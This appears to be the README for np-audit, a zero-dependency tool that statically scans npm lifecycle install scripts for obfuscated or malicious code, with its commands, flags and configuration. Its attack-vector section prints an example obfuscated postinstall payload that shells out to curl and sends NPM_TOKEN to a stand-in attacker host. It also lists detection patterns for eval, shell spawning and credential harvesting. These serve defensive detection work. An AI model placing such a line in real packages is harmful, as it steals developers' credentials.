# np-audit — npm package auditor

Statically detect obfuscated code in npm `preinstall`/`postinstall` scripts **before** they run. Drop-in replacement for `npm install` and `npm ci`.

**Zero dependencies.** Pure Node.js built-ins only.

---

## The Attack Vector

Supply chain attacks targeting the npm ecosystem frequently abuse lifecycle scripts. When you run `npm install`, npm automatically executes any `preinstall`, `install`, or `postinstall` script defined in a package's `package.json`. Attackers ship packages that look legitimate but embed malicious payloads hidden behind obfuscation techniques:

```json
{
  "scripts": {
    "postinstall": "node ./dist/install.js"
  }
}
```

Where `dist/install.js` contains something like:

```js
// Obfuscated — hard to read by design
var _0x3f2a = ['\x72\x65\x71\x75\x69\x72\x65', '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'];
eval(String.fromCharCode(114,101,113,117,105,114,101)+'(\'child_process\').exec(\'curl -s http://evil.example.com/\'+process.env.NPM_TOKEN)');
```

Real-world examples include:

- **[event-stream (2018)](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident)** — malicious postinstall that stole Bitcoin wallet credentials
- **[ua-parser-js (2021)](https://github.com/advisories/GHSA-pjwm-rvh2-c87w)** — cryptocurrency miner + info-stealer injected via hijacked maintainer account
- **[node-ipc (2022)](https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/)** — wiper malware targeting systems by geo-IP
- **[colors / faker (2022)](https://snyk.io/blog/open-source-npm-packages-colors-faker/)** — deliberate sabotage by the maintainer via postinstall
- **XZ Utils (2024)** — multi-year social engineering + backdoor via build scripts (C ecosystem, but same pattern)

**`npa` never executes the scripts.** It downloads and statically analyzes them, detecting:

| Signal | Example |
|---|---|
| `eval()` / `new Function()` | `eval(atob("aGVsbG8="))` |
| Obfuscator.io patterns | `var _0x3f2a = [...]` |
| High-entropy strings | Encrypted/compressed payloads |
| Hex escape density | `\x68\x65\x6c\x6c\x6f` |
| `String.fromCharCode()` chains | `String.fromCharCode(104,101,108,108,111)` |
| Base64 decode + exec | `Buffer.from(x,'base64')` + `eval` |
| Shell spawning | `require('child_process').exec(...)` |
| Large hex literal arrays | `[0x1a, 0x2b, 0x3c, ...]` × 20+ |
| `process.env` access | Token/credential harvesting |
| Outbound network calls | Data exfiltration |

---

## Install

```bash
# Global install (recommended for daily use)
npm install -g np-audit

# Or use directly with npx (no install needed)
npx np-audit scan
npx np-audit install
```

After global install, use the `npa` command:

```bash
npa --version
```

---

## Usage

### Commands

| Command | Alias | Description |
|---|---|---|
| `npa install [package]` | `npa i [package]` | Audit then run `npm install` |
| `npa ci` | — | Audit then run `npm ci` |
| `npa scan` | `npa s` | Scan only, no install |
| `npa config get` | `npa c get` | Show current configuration |
| `npa config set <key> <value>` | `npa c set <key> <value>` | Update a config value |

### Flags

| Flag | Alias | Works with | Description |
|---|---|---|---|
| `--aware` | `-a` | `install`, `ci` | Interactive mode — choose which scripts to allow |
| `--json` | — | `install`, `ci`, `scan` | Machine-readable JSON output |
| `--no-dev` | — | `install`, `ci`, `scan` | Skip devDependencies |
| `--verbose` | — | all | Show fetch progress and extra detail |
| `--version` | — | — | Print version and exit |
| `--help` | `-h` | — | Print help and exit |

### Drop-in replacement for `npm install`

```bash
# Audit all dependencies, then install if clean
npa install          # or: npa i

# Audit a specific package before adding it
npa i express
```

### Drop-in replacement for `npm ci`

```bash
npa ci
```

### Scan only (no install)

```bash
npa scan             # or: npa s
npa s --json         # machine-readable output
npa s --no-dev       # skip devDependencies
npa s --verbose      # show fetch progress
```

### Interactive `--aware` mode

Review each install script yourself and decide which to allow:

```bash
npa i --aware        # or: npa i -a
npa ci --aware
```

```
  npa --aware mode
  Use ↑/↓ to navigate, SPACE to toggle, ENTER to confirm, q to quit

  Found 3 package(s) with install scripts:

     [✓ allow] esbuild@0.24.2       postinstall: post-install.js     OK
   ▶ [✗ deny ] evil-sdk@1.0.0       postinstall: install.js          BLOCK (score: 9)
     [✓ allow] @scope/pkg@2.1.0     postinstall: install.js          WARN (score: 5)

  2 allowed  1 denied
```

After confirmation, `npa` runs `npm install --ignore-scripts` and then manually executes only the scripts you allowed.

### Configuration

```bash
# Show current config
npa config get

# Change thresholds
npa config set blockScore 6    # block at score 6+ (default: 7)
npa config set warnScore 3     # warn at score 3+ (default: 4)

# Skip trusted packages or scopes
npa config set skipPackages '["esbuild","puppeteer"]'
npa config set skipScopes '["@types","@babel"]'
```

Config is stored in `~/.npmauditor.json` (global) and can be overridden per project with `.npmauditor.json` in your project root.

#### All config keys

| Key | Default | Description |
|---|---|---|
| `blockScore` | `7` | Score threshold for hard block (exit 1) |
| `warnScore` | `4` | Score threshold for warning (exit 0) |
| `registry` | `https://registry.npmjs.org` | npm registry URL |
| `timeout` | `30000` | HTTP request timeout (ms) |
| `parallelFetches` | `5` | Concurrent tarball downloads |
| `skipScopes` | `[]` | `@scope` prefixes to skip entirely |
| `skipPackages` | `[]` | Specific package names to skip |

---

## Exit codes

| Code | Meaning |
|---|---|
| `0` | All packages clean or only warnings |
| `1` | One or more packages blocked |

---

## How it works

1. **Parse** `package-lock.json` (supports v1, v2, v3 formats)
2. **Filter** packages: skip dev deps (`--no-dev`), skipped scopes/packages, packages without install scripts
3. **Fetch or read** — for packages in `node_modules`: read from disk. For packages not yet installed: download the tarball from the npm registry and parse it in memory (pure Node.js tar.gz reader, no `tar` package)
4. **Analyze** each `preinstall`/`install`/`postinstall` script file statically — never execute
5. **Score** findings (0–10 per signal), classify as BLOCK / WARN / OK based on config thresholds
6. **Report** results to terminal or `--json`
7. **Proceed** — run npm normally, or in `--aware` mode let you selectively allow scripts

---

## Development

```bash
git clone https://github.com/KoblerS/np-audit.git
cd np-audit
npm test          # run all unit + E2E tests
npm link          # install npa globally from source
```

No build step, no transpilation — plain Node.js ≥ 18.

---

## License

MIT
